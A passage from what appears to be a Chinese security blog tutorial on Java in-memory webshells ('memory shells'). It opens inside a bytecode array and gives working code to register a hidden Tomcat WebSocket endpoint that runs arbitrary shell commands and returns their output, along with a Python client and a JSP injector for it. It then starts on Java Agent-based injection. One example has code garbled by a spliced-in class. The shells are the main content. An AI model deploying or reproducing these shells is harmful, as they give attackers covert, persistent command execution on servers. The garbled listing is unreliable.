<span class="number">7</span>, <span class="number">0</span>, -<span class="number">116</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">54</span>, <span class="number">0</span>, <span class="number">55</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, -<span class="number">111</span>, <span class="number">0</span>, <span class="number">56</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">57</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">47</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">3</span>, <span class="number">0</span>, <span class="number">26</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">24</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">59</span>, -<span class="number">2</span>, <span class="number">0</span>, <span class="number">46</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">59</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">60</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">61</span>, <span class="number">65</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">58</span>, -<span class="number">1</span>, <span class="number">0</span>, <span class="number">20</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">62</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">58</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">7</span>, <span class="number">0</span>, <span class="number">63</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">64</span>, <span class="number">0</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">83</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">42</span>, <span class="number">43</span>, -<span class="number">75</span>, <span class="number">0</span>, <span class="number">22</span>, <span class="number">43</span>, <span class="number">42</span>, -<span class="number">71</span>, <span class="number">0</span>, <span class="number">27</span>, <span class="number">2</span>, <span class="number">0</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">14</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0</span>, <span class="number">42</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">43</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">0</span>, <span class="number">33</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">13</span>, <span class="number">0</span>, <span class="number">66</span>, <span class="number">0</span>, <span class="number">67</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">16</span>, <span class="number">65</span>, <span class="number">0</span>, <span class="number">41</span>, <span class="number">0</span>, <span class="number">68</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">36</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">51</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">42</span>, <span class="number">43</span>, -<span class="number">64</span>, <span class="number">0</span>, <span class="number">7</span>, -<span class="number">74</span>, <span class="number">0</span>, <span class="number">28</span>, -<span class="number">79</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">37</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">17</span>, <span class="number">0</span>, <span class="number">38</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">12</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">39</span>, <span class="number">0</span>, <span class="number">40</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">0</span>, <span class="number">69</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">72</span>, <span class="number">0</span>, <span class="number">73</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">74</span>, <span class="number">0</span>, <span class="number">71</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">18</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">31</span>, <span class="number">0</span>, <span class="number">110</span>, <span class="number">0</span>, <span class="number">70</span>, <span class="number">6</span>, <span class="number">9</span>, <span class="number">0</span>, <span class="number">102</span>, <span class="number">0</span>, -<span class="number">118</span>, <span class="number">0</span>, -<span class="number">120</span>, <span class="number">6</span>, <span class="number">9</span>&#125;;</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> ClassLoader.class.getDeclaredMethod(<span class="string">&quot;defineClass&quot;</span>, <span class="type">byte</span>[].class, <span class="type">int</span>.class, <span class="type">int</span>.class);</span><br><span class="line">                method.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                clazz = (Class) method.invoke(cl, bytes, <span class="number">0</span>, bytes.length);</span><br><span class="line">                <span class="type">ServerEndpointConfig</span> <span class="variable">configEndpoint</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(clazz, urlPath).build();</span><br><span class="line">                <span class="type">WsServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (WsServerContainer) servletContext.getAttribute(ServerContainer.class.getName());</span><br><span class="line">                <span class="keyword">if</span> (<span class="literal">null</span> == container.findMapping(urlPath)) &#123;</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        container.addEndpoint(configEndpoint);</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (DeploymentException e) &#123;</span><br><span class="line">                        e.printStackTrace();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>EvilWebsocket类，主要是想拿到它的字节码，然后加载进JVM中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.catalina.core.ApplicationFilterChain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletContext;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletResponse;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.Endpoint;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.EndpointConfig;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.MessageHandler;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.Session;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerContainer;</span><br><span class="line"><span class="keyword">import</span> javax.websocket.server.ServerEndpointConfig;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Modifier;</span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilWebsocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Session session;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String command)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                isLinux = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;;</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">            session.getBasicRemote().sendText(output);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">            exception.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(<span class="keyword">final</span> Session session, EndpointConfig config)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.session = session;</span><br><span class="line">        session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后可以使用以下python代码作为一个简单的websocket客户端执行命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> websocket</span><br><span class="line"></span><br><span class="line">ws = websocket.create_connection(<span class="string">&quot;ws://127.0.0.1:8080/evilWebsocket&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>(<span class="string">&quot;&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> command != <span class="string">&quot;exit&quot;</span>:</span><br><span class="line">        ws.send(command)</span><br><span class="line">        result = ws.recv()</span><br><span class="line">        <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ws.close()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>执行结果：</p><p><img src="https://pic.imgdb.cn/item/64d26fe21ddac507cc0a3c5c.jpg" alt="image-20230804112541811"></p><h4 id="jsp注入Tomcat-Websocket-型内存马"><a href="#jsp注入Tomcat-Websocket-型内存马" class="headerlink" title="jsp注入Tomcat-Websocket 型内存马"></a>jsp注入Tomcat-Websocket 型内存马</h4><figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerEndpointConfig&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;javax.websocket.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.*&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">EvilWebsocket</span> <span class="keyword">extends</span> <span class="title class_">Endpoint</span> <span class="keyword">implements</span> <span class="title class_">MessageHandler</span>.Whole&lt;String&gt; &#123;</span><br><span class="line">        <span class="keyword">private</span> Session session;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onMessage</span><span class="params">(String command)</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">boolean</span> <span class="variable">isLinux</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">                <span class="type">String</span> <span class="variable">osTyp</span> <span class="operator">=</span> System.getProperty(<span class="string">&quot;os.name&quot;</span>);</span><br><span class="line">                <span class="keyword">if</span> (osTyp != <span class="literal">null</span> &amp;&amp; osTyp.toLowerCase().contains(<span class="string">&quot;win&quot;</span>)) &#123;</span><br><span class="line">                    isLinux = <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                String[] cmds = isLinux ? <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, command&#125; : <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>, <span class="string">&quot;/c&quot;</span>, command&#125;;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmds).getInputStream();</span><br><span class="line">                <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                session.getBasicRemote().sendText(output);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception exception) &#123;</span><br><span class="line">                exception.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onOpen</span><span class="params">(<span class="keyword">final</span> Session session, EndpointConfig config)</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>.session = session;</span><br><span class="line">            session.addMessageHandler(<span class="built_in">this</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> <span class="string">&quot;/evilWebsocket&quot;</span>;</span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line">    <span class="type">ServerEndpointConfig</span> <span class="variable">configEndpoint</span> <span class="operator">=</span> ServerEndpointConfig.Builder.create(EvilWebsocket.class, path).build();</span><br><span class="line">    <span class="type">ServerContainer</span> <span class="variable">container</span> <span class="operator">=</span> (ServerContainer) servletContext.getAttribute(<span class="string">&quot;javax.websocket.server.ServerContainer&quot;</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        container.addEndpoint(configEndpoint);</span><br><span class="line">        servletContext.setAttribute(path,path);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><h3 id="Java-Agent-型内存马"><a href="#Java-Agent-型内存马" class="headerlink" title="Java-Agent 型内存马"></a>Java-Agent 型内存马</h3><h4 id="基本原理"><a href="#基本原理" class="headerlink" title="基本原理"></a>基本原理</h4><p>Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法。Agent 内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意代码添加进去。</p><p>Java Agent 支持两种方式进行加载：</p><ol><li><p>实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）</p></li><li><p>实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有）</p></li></ol><p>实现 premain 方法在RASP中必用到，但是因为通过premain注入内存马过于鸡肋，需要重新启动Web服务，制定-javaagent，这里就不再介绍。先写一个简单的实现了agentmain 方法的例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.Instrumentation;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">AgentMain</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.example.Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">agentmain</span><span class="params">(String agentArgs, Instrumentation inst)</span> &#123;</span><br><span class="line">        inst.addTransformer(<span class="keyword">new</span> <span class="title class_">TestTransformer</span>(), <span class="literal">true</span>);</span><br><span class="line">        Class[] classes = inst.getAllLoadedClasses();</span><br><span class="line">        <span class="keyword">for</span> (Class clas:classes)&#123;</span><br><span class="line">            <span class="keyword">if</span> (clas.getName().equals(ClassName))&#123;</span><br><span class="line">                <span class="keyword">try</span>&#123;</span><br><span class="line">                    <span class="comment">// 对类进行重新定义</span></span><br><span class="line">                    inst.retransformClasses(<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;clas&#125;);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtMethod;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.instrument.ClassFileTransformer;</span><br><span class="line"><span class="keyword">import</span> java.security.ProtectionDomain;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestTransformer</span> <span class="keyword">implements</span> <span class="title class_">ClassFileTransformer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">ClassName</span> <span class="operator">=</span> <span class="string">&quot;org.example.Hello&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">byte</span>[] transform(ClassLoader loader, String className, Class&lt;?&gt; classBeingRedefined, ProtectionDomain protectionDomain, <span class="type">byte</span>[] classfileBuffer) &#123;</span><br><span class="line">        className = className.replace(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;.&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (className.equals(ClassName))&#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">                <span class="type">CtClass</span> <span class="variable">c</span> <span class="operator">=</span> pool.getCtClass(className);</span><br><span class="line">                <span class="type">CtMethod</span> <span class="variable">m</span> <span class="operator">=</span> c.getDeclaredMethod(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line">                m.insertBefore(<span class="string">&quot;System.out.println(\&quot;Attach Successful!\&quot;);&quot;</span>);</span><br><span class="line">                <span class="type">byte</span>[] bytes = c.toBytecode();</span><br><span class="line">                c.detach();</span><br><span class="line">                <span class="keyword">return</span> bytes;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>  打成jar包：</p><p><img src="https://pic.imgdb.cn/item/64d26ff61ddac507cc0a6ded.jpg" alt="image-20230804122643322"></p><p><img src="https://pic.imgdb.cn/item/64d270031ddac507cc0a8fd2.jpg" alt="image-20230804122657923"></p><p>之后我们写以下几个类：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">HelloWorld</span>  &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Hello</span> <span class="variable">h1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hpackage</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;ello();</span><br><span class="line">        h1.Hello();</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="type">Scanner</span> <span class="variable">sc</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">            sc.nextInt();</span><br><span class="line">            <span class="type">Hello</span> <span class="variable">h2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hello</span>();</span><br><span class="line">            h2.Hello();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hello</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">Hello</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Hello World!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 